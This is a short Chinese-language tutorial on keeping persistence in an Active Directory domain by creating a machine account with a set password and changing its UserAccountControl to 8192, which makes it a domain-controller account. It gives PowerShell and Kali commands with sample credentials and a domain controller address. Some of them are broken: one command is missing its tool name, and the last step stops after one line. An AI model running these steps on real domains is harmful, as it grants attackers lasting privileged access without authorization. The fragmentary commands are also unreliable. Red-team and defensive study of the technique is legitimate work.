# UserAccountControl 8192 域内权限维持

## 一、UserAccountControl 8192 概述

```


https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties
```

## 二、实际操作

### 1、添加账户

```

New-ADComputer -Name hello123 -AccountPassword (ConvertTo-SecureString -String "Passw0rd" -Force -AsPlainText)
```

```
# kali

'hello123' -computer-pass 'Passw0rd' -dc-ip 10.10.10.165 'attack.local/oa:!@#Qz123'
 -method SAMR -debug
```

### 2、修改机器账户的 UserAccountControl 为 8192（0x2000）

```


$ADComputer=Get-ADComputer -Identity hello123
```
